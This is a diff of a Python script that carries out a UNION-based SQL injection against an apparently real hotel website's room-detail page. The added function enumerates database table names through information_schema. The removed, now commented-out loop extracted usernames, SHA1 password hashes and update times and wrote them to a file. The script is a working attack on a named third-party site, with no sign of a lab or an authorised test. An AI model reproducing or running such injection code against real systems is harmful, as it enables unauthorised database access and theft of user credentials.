@@ -26,24 +26,36 @@ def req_url(nomor, column):
     soup = bs4.BeautifulSoup(response.text, 'html.parser')
     div = soup.find("div", {"id": "subheader"})
     return div.text if div else None
-password_founded=False
-while True:
-    username = req_url(nomor, "username")
-    password_sha1 = req_url(nomor, "password")
-    last_update = req_url(nomor, "last_update")
+
+def req_table(nomor):
+    urls = f"http://www.embryohotel.com/room-detail.php?id=-4833 UNION ALL SELECT NULL,NULL,TABLE_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables limit {nomor},1"
+    response = requests.get(urls)
+    # get div id id="subheader" in response.text using beautifulsoup
+    soup = bs4.BeautifulSoup(response.text, 'html.parser')
+    div = soup.find("div", {"id": "subheader"})
+    return div.text if div.text.strip() != '' else None
+# password_founded=False
+# while True:
+#     # username = req_url(nomor, "username")
+#     # password_sha1 = req_url(nomor, "password")
+#     # last_update = req_url(nomor, "last_update")
+#     table_name = req_table(nomor)
+#     # if username and password_sha1 and last_update:
+#         # tables.append(f"{username};{password_sha1};{last_update}")
+#     print(f"{table_name}")
+#     tables.append(f"{table_name}")
     
-    if username and password_sha1 and last_update:
-        tables.append(f"{username};{password_sha1};{last_update}")
-    
-    if nomor > 3:
-        break
-    time.sleep(1)
-    nomor += 1
+#     if table_name == None:
+#         break
+#     time.sleep(1)
+#     nomor += 1
+
 
 # save tables into tables.txt
-with open("tables.txt", "w") as f:
-    for table in tables:
-        f.write(f"{table}\n")
-    f.close()
+# with open("tables.txt", "w") as f:
+#     for table in tables:
+#         f.write(f"{table}\n")
+#     f.close()
 
-    
+
+print("done")    
